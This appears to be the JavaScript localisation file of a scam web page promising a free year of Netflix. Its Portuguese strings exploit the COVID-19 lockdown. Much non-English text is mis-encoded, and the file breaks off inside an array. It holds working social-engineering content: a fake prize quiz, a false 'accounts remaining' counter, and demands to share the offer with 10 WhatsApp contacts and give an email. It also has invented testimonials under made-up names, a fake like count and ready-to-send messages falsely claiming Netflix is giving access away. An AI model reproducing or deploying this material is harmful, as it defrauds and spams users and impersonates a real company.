var lng = 'pt';
var transport = [];
var c =0 ;

$.extend({
    alert: function(message, title) {
        $("<div></div>").dialog({
            buttons: {
                "Ok": function() {
              
                    $(this).dialog("close")
                }
            },
            close: function(event, ui) {
                $(this).remove()
            },
            resizable: false,
            title: title,
            modal: true
        }).text(message)
    }
});

transport['txt01'] = {
	"en": 'Free 1-Year Promotion Netflix!',
    "fr": "Promotion gratuite d'un an Netflix!",
    "es": 'PromociÃ³n 1 aÃ±o gratis Netflix!',
	"ru": 'Ð‘ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¹ 1-Ð»ÐµÑ‚Ð½Ð¸Ð¹ Ð¿Ñ€Ð¾Ð¼Ð¾ÑƒÑ‚ÐµÑ€ Netflix!',
    "pt": 'Netflix grÃ¡tis no periodo de isolamento!',
	"id": 'Promosi berlangganan Netflix 1 tahun!'
};

transport['gutschein'] = {
    "en": 'Accounts that still remain',
    "fr": "Comptes qui restent encore",
    "es": 'Cuentas que aÃºn quedan',
	"ru": 'ÐžÑÑ‚Ð°Ð²ÑˆÐ¸ÐµÑÑ Ð£Ñ‡ÐµÑ‚Ð½Ñ‹Ðµ Ð·Ð°Ð¿Ð¸ÑÐ¸',
    "pt": 'Contas restantes: ',
	"id": 'Sisa Akun:'
};

transport['gutschein2'] = {
	"en": 'Loading...',
    "fr": "Chargement...",
    "es": 'Cargando...',
	"ru": 'Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ°...',
    "pt": 'Carregando...',
	"id": 'Memuat...'
};

transport['aufforderung'] = {
	"en": 'Please, to participate, please respond first:',
    "fr": "S'il vous plaÃ®t, pour participer, s'il vous plaÃ®t rÃ©pondez d'abord:",
    "es": 'Por favor, para participar, responda primero:',
	"ru": 'Ð”Ð»Ñ ÑƒÑ‡Ð°ÑÑ‚Ð¸Ðµ Ð²Ñ‹ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð¾Ñ‚Ð²ÐµÑ‚Ð¸Ñ‚ÑŒ Ð½Ð° ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ðµ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑ‹',
    "pt": 'Devido a pandemia de COVID-19, nÃ³s estamos liberando acesso totalmente grÃ¡tis a nossa plataforma pelo perÃ­odo de isolamento, atÃ© que o vÃ­rus seja contido. Por favor, para participar responda primeiro:',
	"id": 'Tolong, untuk berpartisipasi, tolong tanggapi dulu:'
};

transport['frage_01'] = {
	"en": 'Question 1: What do you most often watch?',
    "fr": "Question 1: Que regardez-vous le plus souvent?",
    "es": 'Pregunta 1: Â¿QuÃ© es lo que mÃ¡s ves?',
	"ru": 'Ð’Ð¾Ð¿Ñ€Ð¾Ñ 1: Ð§Ñ‚Ð¾ Ð²Ñ‹ Ñ‡Ð°Ñ‰Ðµ Ð²ÑÐµÐ³Ð¾ Ð½Ð°Ð±Ð»ÑŽÐ´Ð°ÐµÑ‚Ðµ?',
    "pt": 'Pergunta 1: VocÃª estÃ¡ tomando os cuidados para a nÃ£o proliferaÃ§Ã£o do vÃ­rus?',
	"id": 'Pertanyaan 1: Apa yang paling sering Anda tonton?'
};

transport['frage_02'] = {
	"en": 'Question 2: Do you already have a netflix account?',
    "fr": "Question 2: Avez-vous dÃ©jÃ  un compte netflix?",
    "es": 'Pregunta 2: Â¿Ya tienes una cuenta de Netflix?',
	"ru": 'Ð’Ð¾Ð¿Ñ€Ð¾Ñ 2: Ð£ Ð²Ð°Ñ ÑƒÐ¶Ðµ ÐµÑÑ‚ÑŒ ÑƒÑ‡ÐµÑ‚Ð½Ð°Ñ Ð·Ð°Ð¿Ð¸ÑÑŒ netflix?',
    "pt": 'Pergunta 2: VocÃª acredita que o isolamento social ajudarÃ¡ na contenÃ§Ã£o do CoronaVÃ­rus?',
	"id": 'Pertanyaan 2: Apakah Anda sudah memiliki akun netflix?'
};

transport['frage_03'] = {
	"en": 'Question 3: Where did you first meet netflix?',
    "fr": "Question 3: OÃ¹ avez-vous rencontrÃ© Netflix pour la premiÃ¨re fois?",
    "es": 'Pregunta 3: Â¿DÃ³nde conociste a netflix por primera vez?',
	"ru": 'Ð’Ð¾Ð¿Ñ€Ð¾Ñ 3: Ð“Ð´Ðµ Ð²Ñ‹ Ð²Ð¿ÐµÑ€Ð²Ñ‹Ðµ Ð²ÑÑ‚Ñ€ÐµÑ‚Ð¸Ð»Ð¸ÑÑŒ Ñ netflix?',
    "pt": 'Pergunta 3: VocÃª acha que medidas como essa ajudam nesse momento?',
	"id": 'Pertanyaan 3: Apakah Anda pernah bertemu netflix di mana?'
};

transport['frage_04'] = {
	"en": 'Question 4: Would you recommend netflix to your friends?',
    "fr": "Question 4: Recommanderiez-vous netflix Ã  vos amis?",
    "es": 'Pregunta 4: Â¿Usted indicarÃ­a netflix a sus amigos?',
	"ru": 'Ð’Ð¾Ð¿Ñ€Ð¾Ñ 4: Ð’Ñ‹ Ð¿Ð¾Ñ€ÐµÐºÐ¾Ð¼ÐµÐ½Ð´Ð¾Ð²Ð°Ð»Ð¸ Ð±Ñ‹ netflix ÑÐ²Ð¾Ð¸Ð¼ Ð´Ñ€ÑƒÐ·ÑŒÑÐ¼?',
    "pt": 'Pergunta 4: VocÃª deseja ter acesso grÃ¡tis a nossa plataforma no perÃ­odo de isolamento?',
	"id": 'Pertanyaan 4: Apakah Anda merekomendasikan netflix kepada teman-teman Anda?'
};

transport['content_02'] = {
	"en": 'Please wait...',
    "fr": "S'il vous plaÃ®t, attendez...",
    "es": 'Por favor espera...',
	"ru": 'ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð°, Ð¿Ð¾Ð´Ð¾Ð¶Ð´Ð¸Ñ‚Ðµ...',
    "pt": 'Por favor aguarde...',
	"id": 'Tolong Tunggu ...'
};


transport['pruefen_01'] = {
    "en": 'All questions have been answered',
    "fr": 'Toutes les questions ont rÃ©pondu',
    "es": 'Todas las preguntas han sido respondidas',
	"ru": 'Ð’Ñ‹ Ð¾Ñ‚Ð²ÐµÑ‚Ð¸Ð»Ð¸ Ð½Ð° Ð²ÑÐµ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑ‹',
    "pt": 'Todas as perguntas foram respondidas',
	"id": 'Semua pertanyaan dijawab'
};


transport['pruefen_02'] = {
    "en": 'Checking availability ...',
    "fr": 'VÃ©rification de la disponibilitÃ© ...',
    "es": 'Comprobando disponibilidad ...',
	"ru": 'ÐÐµ Ð½Ð°Ð¹Ð´ÐµÐ½Ð¾ Ð½Ð¸ Ð¾Ð´Ð½Ð¾Ð³Ð¾ Ð½ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾Ñ‚Ð²ÐµÑ‚Ð°',
    "pt": 'Verificando disponibilidade...',
	"id": 'Memeriksa ketersediaan ...'
};


transport['pruefen_03'] = {
	"en": 'You won a year of free netflix!',
    "fr": "Vous avez gagnÃ© une annÃ©e de Netflix gratuit!",
    "es": 'Â¡Has ganado un aÃ±o de netflix gratis!',
	"ru": 'Ð’Ñ‹ Ð²Ñ‹ Ð²Ñ‹Ð¸Ð³Ñ€Ð°Ð»Ð¸ ÐºÑƒÐ¿Ð¾Ð½!',
    "pt": 'VocÃª ganhou uma assinatura Netflix grÃ¡tis!',
	"id": 'Anda memenangkan satu tahun langganan Netflix!'
};


transport['button1'] = {
	"en": 'Movies',
    "fr": "Films",
    "es": 'PelÃ­culas',
	"ru": 'ÐšÐ¸Ð½Ð¾',
    "pt": 'Sim',
	"id": 'Film'
};



transport['button2'] = {
	"en": 'Series',
    "fr": "SÃ©ries",
    "es": 'Serie',
	"ru": 'Ð¡ÐµÑ€Ð¸Ð¸',
    "pt": 'NÃ£o',
	"id": 'Seri'
};



transport['button3'] = {
	"en": 'Documentaries',
    "fr": "Documentaires",
    "es": 'Documentales',
	"ru": 'Ð”Ð¾ÐºÑƒÐ¼ÐµÐ½Ñ‚Ð°Ð»ÑŒÐ½Ð¾Ðµ',
    "pt": 'Estou comeÃ§ando',
	"id": 'Film'
};


transport['button4'] = {
    "en": 'Yes',
    "fr": 'Oui',
    "es": 'SÃ­',
	"ru": 'Ð´Ð°',
    "pt": 'Sim',
	"id": 'Ya'
};


transport['button5'] = {
    "en": 'No',
    "fr": 'Ne Pas',
    "es": 'No',
	"ru": 'Ð½Ð°',
    "pt": 'NÃ£o',
	"id": 'Tidak'
};


transport['button6'] = {
	"en": 'Friends',
    "fr": "",
    "es": '',
	"ru": '',
    "pt": 'Sim',
	"id": 'Teman-teman'
};

transport['button7'] = {
	"en": 'Friends',
    "fr": "Copains",
    "es": 'Amigos',
	"ru": 'Ð´Ñ€ÑƒÐ·ÑŒÑ',
    "pt": 'NÃ£o',
	"id": 'Internet'
};

transport['button8'] = {
	"en": 'Adverts',
    "fr": "Annonces",
    "es": 'Anuncios',
	"ru": 'ÐžÐ±ÑŠÑÐ²Ð»ÐµÐ½Ð¸Ñ',
    "pt": 'NÃ£o sei',
	"id": 'Iklan'
};


transport['para'] = {
    "en": 'Congratulations!',
    "fr": 'FÃ©licitations!',
    "es": 'Felicitaciones!',
	"ru": 'ÐŸÐ¾Ð·Ð´Ñ€Ð°Ð²Ð»ÑÐµÐ¼ Ð²Ð°Ñ!',
    "pt": 'ParabÃ©ns!',
	"id": 'Selamat!'
};


transport['ganhou'] = {
	"en": 'You have won !! <br/> To activate 1 year of free netflix, follow the steps:',
    "fr": "Tu as gagnÃ© !! <br/> Pour activer 1 an de netflix gratuit, suivez les Ã©tapes:",
    "es": 'Usted ha ganado !! <br/> Para activar 1 aÃ±o de netflix gratis, siga los pasos:',
	"ru": 'Ð’Ñ‹ Ð²Ñ‹Ð¸Ð³Ñ€Ð°Ð»Ð¸ 1 Ð³Ð¾Ð´ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ð¾Ð³Ð¾ netflix!',
    "pt": 'VocÃª ganhou!!<br/> Para <b>ativar sua conta</b> agora, siga os passos:',
	"id": 'Anda telah menang !! <br/> Untuk mengaktifkan 1 tahun netflix gratis, ikuti langkah-langkahnya:'
};


transport['passo1'] = {
    "en": '1. Share to 5 of your friends/groups via WhatsApp (Click the "WhatsApp" icon below).',
    "fr": '1. Partager Ã  10 de vos amis/groupes via WhatsApp (Cliquez sur l\'icÃ´ne "WhatsApp" ci-dessous).',
    "es": '1. Comparta a 10 de sus amigos/grupos a travÃ©s de WhatsApp (Haga clic en el icono "WhatsApp" abajo).',
	"ru": 'ÐšÐ°Ðº Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ ÑÐ²Ð¾ÑŽ ÑƒÑ‡ÐµÑ‚Ð½ÑƒÑŽ Ð·Ð°Ð¿Ð¸ÑÑŒ: <br/>1.ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÐµÑÑŒ Ñ 10 ÑÐ²Ð¾Ð¸Ð¼Ð¸ Ð´Ñ€ÑƒÐ·ÑŒÑÐ¼Ð¸/Ð³Ñ€ÑƒÐ¿Ð¿Ð°Ð¼Ð¸ Ð² WhatsApp (Ð¶Ð¼Ð¸Ñ‚Ðµ Ð½Ð° ÐºÐ½Ð¾Ð¿ÐºÑƒ WhatsApp).',
    "pt": '1. Compartilhe para 10 dos seus amigos/grupos via WhatsApp (Clique no Ã­cone "WhatsApp" abaixo).',
	"id": '1. Bagikan ke 10 teman / grup Anda melalui WhatsApp (Klik ikon "WhatsApp" di bawah).'
};


transport['passo2'] = {
    "en": '2. Click on "Activate account".',
    "fr": '2. Cliquez sur "Activer le compte".',
    "es": '2. Haga clic en "Activar cuenta".',
	"ru": '2.Ð–Ð¼Ð¸Ñ‚Ðµ Ð½Ð° "ÐÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚" Ð¸ ÑÐ»ÐµÐ´ÑƒÐ¹Ñ‚Ðµ Ñ„Ð¸Ð½Ð°Ð»ÑŒÐ½Ñ‹Ð¼ Ð¸Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸ÑÐ¼.',
    "pt": '2. Clique em "Ativar conta" e insira seu e-mail.',
	"id": '2. Klik "Aktifkan akun" dan masukkan email Anda.'
};


transport['passo3'] = {
    "en": '3. A new window will open with the access login of your account.',
    "fr": '3. Une nouvelle fenÃªtre s\'ouvrira avec le login d\'accÃ¨s de votre compte.',
    "es": '3. Se abrirÃ¡ una nueva ventana con el acceso de acceso de su cuenta.',
	"ru": '3.Ð’Ñ‹ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚Ðµ ÑÐ²Ð¾Ð¹ ÐºÑƒÐ¿Ð¾Ð½ Ð·Ð° 5-10 Ð¼Ð¸Ð½ÑƒÑ‚',
    "pt": '3. VocÃª receberÃ¡ sua conta em 5 a 10 minutos.',
	"id": '3. Anda akan menerima akun Anda dalam 5-10 menit.'
};


transport['bativ'] = {
	"en": 'Activate account',
    "fr": "Activer le compte",
    "es": "Activar cuenta",
	"ru": 'ÐÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚',
    "pt": 'Ativar conta',
	"id": 'Aktifkan akun'
};


transport['like'] = {
    "en": 'Like',
    "fr": "J'aime",
    "es": 'Me gusta',
	"ru": 'Ð›Ð°Ð¹Ðº  ',
    "pt": 'Curtir',
	"id": 'Suka'
};


transport['comm'] = {
    "en": 'Comment',
    "fr": 'Commenter',
    "es": 'Comentar',
	"ru": 'ÐšÐ¾Ð¼Ð¼ÐµÐ½Ñ‚Ð°Ñ€Ð¸Ð¹  ',
    "pt": 'Comentar',
	"id": 'Tinggalkan Balasan'
};


transport['share'] = {
    "en": 'Share',
    "fr": 'Partagez Ã§a',
    "es": 'Partager',
	"ru": 'ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ',
    "pt": 'Compartilhar',
	"id": 'Bagikan ini'
};


transport['comm2'] = {
    "en": 'You and',
    "fr": 'Toi et',
    "es": 'Tu eres',
	"ru": '',
    "pt": 'VocÃª e',
	"id": 'Anda dan'
};


transport['comm3'] = {
    "en": ' 58,249 Others like this.',
    "fr": ' 58 249 D\'autres comme Ã§a.',
    "es": ' 58,249 Otros como Ã©ste.',
	"ru": ' 99,249 Ð½Ñ€Ð°Ð²Ð¸Ñ‚ÑÑ ÑÑ‚Ð¾',
    "pt": ' 58,249 Outros como este.',
	"id": ' 58,249 Lainnya menyukai ini.'
};


transport['fras1'] = {
	"en": 'I loved this promotion, I just activated my account!',
    "fr": "J'ai adorÃ© cette promotion, je viens d'activer mon compte!",
    "es": 'Me encantÃ³ esta promociÃ³n, Â¡acabo de activar mi cuenta!',
	"ru": 'ÐœÐ½Ðµ Ð¿Ð¾Ð½Ñ€Ð°Ð²Ð¸Ð»Ð¾ÑÑŒ ÑÑ‚Ð¾ Ð¿Ñ€Ð¾Ð´Ð²Ð¸Ð¶ÐµÐ½Ð¸Ðµ, Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð°ÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ð» ÑÐ²Ð¾Ð¹ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚!',
    "pt": 'Adorei essa aÃ§Ã£o! Vai ajudar muito a conter essa doenÃ§a, acabei de ativar minha conta!',
	"id": 'Saya suka promosi ini, saya baru saja mengaktifkan akun saya!'
};


transport['fras2'] = {
	"en": 'It worked! My account just arrived.',
    "fr": "Ã‡a a marchÃ©! Mon compte vient d'arriver.",
    "es": 'Â¡FuncionÃ³! Mi cuenta acaba de llegar.',
	"ru": 'Ð­Ñ‚Ð¾ ÑÑ€Ð°Ð±Ð¾Ñ‚Ð°Ð»Ð¾! ÐœÐ¾Ñ ÑƒÑ‡ÐµÑ‚Ð½Ð°Ñ Ð·Ð°Ð¿Ð¸ÑÑŒ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ñ‡Ñ‚Ð¾ Ð¿Ñ€Ð¸Ð±Ñ‹Ð»Ð°.',
    "pt": 'Deu certo! Minha conta acabou de chegar. Ã“tima campanha contra esse vÃ­rus!',
	"id": 'Itu berhasil! Akun saya baru saja tiba.'
};


transport['fras3'] = {
	"en": 'Now I can watch my favorite series!',
    "fr": "Maintenant, je peux regarder ma sÃ©rie prÃ©fÃ©rÃ©e!",
    "es": 'Â¡Ahora puedo ver mis series favoritas!',
	"ru": 'Ð¢ÐµÐ¿ÐµÑ€ÑŒ Ñ Ð¼Ð¾Ð³Ñƒ Ð¿Ð¾ÑÐ¼Ð¾Ñ‚Ñ€ÐµÑ‚ÑŒ ÑÐ²Ð¾ÑŽ Ð»ÑŽÐ±Ð¸Ð¼ÑƒÑŽ ÑÐµÑ€Ð¸ÑŽ!',
    "pt": 'Agora vou assistir La casa de papel nessa quarentena!',
	"id": 'Sekarang saya akan menonton rumah kertas haha'
};


transport['fras4'] = {
	"en": 'My account had expired, glad to be able to activate 1 year free haha',
    "fr": "Mon compte a expirÃ©, heureux d'Ãªtre en mesure d'activer 1 an gratuit haha",
    "es": 'Mi cuenta habÃ­a expirado, me alegro de poder activar 1 aÃ±o gratis',
	"ru": 'ÐœÐ¾Ñ ÑƒÑ‡ÐµÑ‚Ð½Ð°Ñ Ð·Ð°Ð¿Ð¸ÑÑŒ Ð¸ÑÑ‚ÐµÐºÐ»Ð°, Ñ€Ð°Ð´, Ñ‡Ñ‚Ð¾ ÑÐ¼Ð¾Ð¶ÐµÑ‚ Ð°ÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ 1 Ð³Ð¾Ð´ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ð¾Ð³Ð¾ Ñ…Ð°Ñ…Ð°',
    "pt": 'Minha conta tinha expirado, agora vou ficar em casa nessa quarentena tranquilo!!',
	"id": 'Akun saya sudah kadaluwarsa, senang bisa mengaktifkan 1 tahun'
};


transport['fras5'] = {
	"en": 'Yes, I was able to activate!!',
    "fr": "Oui, j'Ã©tais capable d'activer!",
    "es": 'SÃ­, Â¡pude activar!',
	"ru": 'Ð”Ð°, Ñ ÑÐ¼Ð¾Ð³ Ð°ÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ!',
    "pt": 'Sim, eu consegui ativar!! Ufaaaa!',
	"id": 'Ya, saya bisa mengaktifkan!'
};


transport['fras6'] = {
	"en": 'This promotion will end quickly, everyone wants haha',
    "fr": "Cette promotion se terminera rapidement, tout le monde veut",
    "es": 'Esta promociÃ³n terminarÃ¡ rÃ¡pido, todo el mundo quiere jaja',
	"ru": '',
    "pt": 'Quem diria, essa promoÃ§Ã£o vai acabar rÃ¡pido, todo mundo quer ver filme nessa quarentena',
	"id": 'promosi ini akan berakhir dengan cepat, semua orang menginginkannya'
};


transport['fras7'] = {
    "en": 'Yes, I got my account!',
    "fr": 'Oui, j\'ai mon compte!',
    "es": 'Â¡SÃ­, conseguÃ­ mi cuenta!',
	"ru": 'Ð­Ñ‚Ð° Ð°ÐºÑ†Ð¸Ñ Ð±Ñ‹ÑÑ‚Ñ€Ð¾ Ð·Ð°ÐºÐ¾Ð½Ñ‡Ð¸Ñ‚ÑÑ, Ð²ÑÐµ Ñ…Ð¾Ñ‚ÑÑ‚',
    "pt": 'Obrigada netflix eu consegui!',
	"id": 'Terima kasih Netflix, aku mengerti!'
};


transport['fras8'] = {
	"en": 'I loved this promotion!',
    "fr": "J'ai adorÃ© cette promotion!",
    "es": 'Â¡Me encantÃ³ esta promociÃ³n!',
	"ru": 'ÐœÐ½Ðµ Ð¿Ð¾Ð½Ñ€Ð°Ð²Ð¸Ð»Ð¾ÑÑŒ ÑÑ‚Ð¾ Ð¿Ñ€Ð¾Ð´Ð²Ð¸Ð¶ÐµÐ½Ð¸Ðµ!',
    "pt": 'Eu amei essa aÃ§Ã£o!',
	"id": 'Saya suka promosi ini!'
};


transport['fras9'] = {
    "en": 'Thank you!',
    "fr": 'Merci!',
    "es": 'Â¡Muchas gracias!',
	"ru": 'ÑÐ¿Ð°ÑÐ¸Ð±Ð¾',
    "pt": 'Muito obrigada!',
	"id": 'Terima kasih!'
};


transport['clike'] = {
    "en": 'Like',
    "fr": "J'aime",
    "es": 'Me gusta',
	"ru": 'Ð›Ð°Ð¹Ðº',
    "pt": 'Curtir',
	"id": 'Suka'
};


transport['creply'] = {
    "en": 'Reply',
    "fr": 'RÃ©pondre',
    "es": 'Responder',
	"ru": 'ÐžÑ‚Ð²ÐµÑ‚Ñ‹',
    "pt": 'Resposta',
	"id": 'Jawaban'
};


transport['cnow'] = {
    "en": 'Now',
    "fr": 'En ce moment',
    "es": 'Ahora mismo',
	"ru": 'Ð¢Ð¾Ð»ÑŒÐºÐ¾ Ñ‡Ñ‚Ð¾',
    "pt": 'Agora mesmo',
	"id": 'Sekarang'
};


transport['type'] = {
    "en": 'Write a comment ...',
    "fr": 'Ecrire un commentaire ...',
    "es": 'Escribir un comentario ...',
	"ru": '',
    "pt": 'Escrever um comentÃ¡rio...',
	"id": 'Tulis komentar ...'
};


transport['moreinf'] = {
    "en": 'More information',
    "fr": 'Plus d\'informations',
    "es": 'Mas informaciones',
	"ru": 'Ð‘Ð¾Ð»ÑŒÑˆÐµ Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ð¸',
    "pt": 'Mais informaÃ§Ãµes',
	"id": 'Informasi lebih lanjut'
};


transport['offer'] = {
    "en": '* This offer is only valid for a limited time.',
    "fr": '* Cette offre n\'est valable que pour une durÃ©e limitÃ©e.',
    "es": '* Esta oferta sÃ³lo es vÃ¡lida por tiempo limitado.',
	"ru": '*Ð­Ñ‚Ð¾ Ð¿Ñ€ÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ Ð»Ð¸Ð¼Ð¸Ñ‚Ð½Ð¾Ðµ',
    "pt": '* Esta oferta sÃ³ Ã© vÃ¡lida por tempo limitado.',
	"id": '* Penawaran ini hanya berlaku untuk waktu yang terbatas.'
};

transport['msg1'] = {
    "en": 'Share with WhatsApp friends about our promotion! \n\n You must share to proceed',
    "fr": 'Partagez avec des amis WhatsApp sur notre promotion ! \n\n Vous devez partager pour continuer',
    "es": 'Compartir con los amigos de WhatsApp sobre nuestra promociÃ³n! \n\n Usted debe compartir para proseguir',
	"ru": 'ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÐµÑÑŒ Ñ Ð´Ñ€ÑƒÐ·ÑŒÑÐ¼Ð¸ 10 WhatsApp Ð¾ Ð½Ð°ÑˆÐµÐ¹ Ð°ÐºÑ†Ð¸Ð¸! \n\n Ð’Ñ‹ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð¿Ð¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ñ€Ð¸Ð½ÑÑ‚ÑŒ ÑƒÑ‡Ð°ÑÑ‚Ð¸Ðµ!',
    "pt": 'Compartilhe com 10 amigos do WhatsApp sobre a nossa promoÃ§Ã£o!\n\n VocÃª deve compartilhar para participar! ',
	"id": 'Bagikan dengan 10 teman WhatsApp tentang promosi kami! \ N \ n Anda harus berbagi untuk berpartisipasi!'
};

transport['msg2'] = {
    "en": 'Share with WhatsApp friends about our promotion! \n\n You must share to proceed',
    "fr": 'Partagez avec des amis WhatsApp sur notre promotion ! \n\n Vous devez partager pour continuer',
    "es": 'Compartir con los amigos de WhatsApp sobre nuestra promociÃ³n! \n\n Usted debe compartir para proseguir',
	"ru": 'ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÐµÑÑŒ Ñ Ð´Ñ€ÑƒÐ·ÑŒÑÐ¼Ð¸ 10 WhatsApp Ð¾ Ð½Ð°ÑˆÐµÐ¹ Ð°ÐºÑ†Ð¸Ð¸! \n\n Ð’Ñ‹ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð¿Ð¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ñ€Ð¸Ð½ÑÑ‚ÑŒ ÑƒÑ‡Ð°ÑÑ‚Ð¸Ðµ!',
    "pt": 'Compartilhe com 10 amigos do WhatsApp sobre a nossa promoÃ§Ã£o!\n\n VocÃª deve compartilhar para ativar sua conta! ',
	"id": 'Bagikan dengan 10 teman WhatsApp tentang promosi kami! \ N \ n Anda harus berbagi untuk mengaktifkan akun Anda!'
};



transport['namme1'] = {
    "en": 'Andrea Santos',
	"fr": 'Andrea Santos',
	"es": 'Andrea Santos',
	"pt": 'Andrea Santos',
	"ru": "ÐŸÐ°Ð²ÐµÐ» ÐœÐµÐ´Ð²ÐµÐ´ÐµÐ²",
	"id": 'Sherly'
};

transport['namme2'] = {
	"en": 'Juan Gonzales',
	"fr": 'Juan Gonzales',
	"es": 'Juan Gonzales',
	"pt": 'Juan Gonzales',
	"ru": "Ð®Ð»Ð¸Ñ Ð¡ÐµÑ€Ð±ÐµÐ½ÐºÐ¾",
	"id": 'Siska'
};


transport['namme3'] = {
	"en": 'Roberta Figueredo',
	"fr": 'Roberta Figueredo',
	"es": 'Roberta Figueredo',
    "pt": 'Roberta Figueredo',
	"ru": " Ð®Ð»Ð¸Ñ Ð¡ÐµÑ€Ð±ÐµÐ½ÐºÐ¾",
	"id": 'Yuliana'
};

transport['namme4'] = {
	"en": 'Michael Lorenzo',
	"fr": 'Michael Lorenzo',
	"es": 'Michael Lorenzo',
    "pt": 'Michael Lorenzo',
	"ru": "Ð•ÐºÐ°Ñ‚ÐµÑ€Ð¸Ð½Ð° Ð‘ÐµÐ»ÑÐµÐ²Ð°",
	"id": 'Nanda'
};

transport['namme5'] = {
	"en": 'Joana Furlan',
	"fr": 'Joana Furlan',
	"es": 'Joana Furlan',
    "pt": 'Joana Furlan',
	"ru": "ÐœÐ°Ð»Ð¸Ðº Ð¡Ð²ÐµÑ‚Ð»Ð°ÐºÐ¾Ð² ",
	"id": 'Novita'
};

transport['namme6'] = {
	"en": 'Cristiane Gardebal',
	"fr": 'Cristiane Gardebal',
	"es": 'Cristiane Gardebal',
    "pt": 'Cristiane Gardebal',
	"ru": "Ð›Ð°Ñ€Ð¸ÑÐ° ÐŸÐµÑ‚Ñ€Ð¾Ð²Ð° ",
	"id": 'Fransiska'
};

transport['namme7'] = {
	"en": 'Diana Lenf',
	"fr": 'Diana Lenf',
	"es": 'Diana Lenf',
    "pt": 'Diana Lenf',
	"ru": "ÐšÑÑŽÑˆÐ° ÐœÐµÐ´Ð²ÐµÐ´ÐµÐ²Ð° ",
	"id": 'Melisa'
};

transport['namme8'] = {
	"en": 'Ryan Forrget',
	"fr": 'Flora Matos',
	"es": 'Flora Matos',
    "pt": 'Flora Matos',
	"ru": "Ð”Ð°Ð½Ð¸ÑÐ»Ð° Ð›ÐµÐ½Ð¸Ð½Ð°",
	"id": 'Linda'
};

transport['namme9'] = {
	"en": 'Claudia Zinguerberg',
	"fr": 'Claudia Zinguerberg',
	"es": 'Claudia Zinguerberg',
    "pt": 'Claudia Zinguerberg',
	"ru": "Ð’Ð°Ð»ÐµÐ½Ñ‚Ð¸Ð½Ð° Ð›Ð°Ð·Ð°Ñ€ÐµÐ²Ð°",
	"id": 'Natasha'
};

transport['namme10'] = {
    "en": 'Mateo Sidreos',
	"fr": 'Mateo Sidreos',
	"es": 'Mateo Sidreos',
    "pt": 'Francisco Neto',
	"ru": "Ð®Ð»Ð¸Ñ Ð¢Ð¸Ð¼Ð¾Ð²ÑÐºÐ°Ñ",
	"id": 'Jihan'
};

var msgsamigo = [];
msgsamigo['pt'] = [
'Devido a grande pandemia do CORONA VÃRUS no mundo todo, a Netflix estÃ¡ liberando o acesso a plataforma deles pelo perÃ­odo de isolamento. Corre no site que Ã© sÃ³ pra quem se cadastrar nos prÃ³ximos 2 dias!',
'Com a grande disseminaÃ§Ã£o do CORONA VÃRUS no mundo, a Netflix estÃ¡ liberando acesso a sua plataforma para os primeiros a se cadastrarem no site deles! Ã‰ por pouco tempo os cadastros!',
'A Netflix decidiu liberar o acesso a sua plataforma de filmes e sÃ©ries pelo perÃ­odo de isolamento das pessoas, mas Ã© por pouco tempo o cadastramento! Corre no site',
];

msgsamigo['en'] = [
'Netflix is giving away 1 year of free subscription !!',
'Netflix is giving away 1 year of free subscription !!'
];

msgsamigo['es'] = [
'Â¡Netflix estÃ¡ regalando 1 aÃ±o de suscripciÃ³n gratuita!',
'Â¡Netflix estÃ¡ regalando 1 aÃ±o de suscripciÃ³n gratuita!'
];

msgsamigo['fr'] = [
"Netflix donne 1 an d'abonnement gratuit !!",
"Netflix donne 1 an d'abonnement gratuit !!"
];

msgsamigo['ru'] = [
'Netflix Ð´Ð°ÐµÑ‚ 1 Ð³Ð¾Ð´ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ð¾Ð¹ Ð¿Ð¾Ð´Ð¿Ð¸ÑÐºÐ¸! ÐŸÐ¾ÑÐ¿ÐµÑˆÐ¸ Ð¿Ð¾ÐºÐ° Ð½Ðµ Ð·Ð°ÐºÐ¾Ð½Ñ‡Ð¸Ð»Ð¸ÑÑŒ',
